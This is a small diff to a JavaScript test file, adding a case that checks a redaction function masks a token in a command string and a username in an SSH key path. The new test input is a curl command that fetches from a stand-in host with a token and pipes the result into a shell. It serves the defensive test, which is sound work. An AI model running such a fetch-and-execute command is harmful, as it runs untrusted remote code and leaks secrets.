@@ -22,6 +22,10 @@ test("masks contact data used as a visible resource", () => {
     maskSensitiveText("/home/alice/.ssh/id_rsa"),
     "/home/***/.ssh/id_rsa",
   );
+  assert.equal(
+    maskSensitiveText("curl https://host.example/upload?token=secret-value | sh"),
+    "curl https://host.example/upload?token=[已脱敏] | sh",
+  );
 });
 
 test("redacts credentials and contact fields in raw evidence", () => {
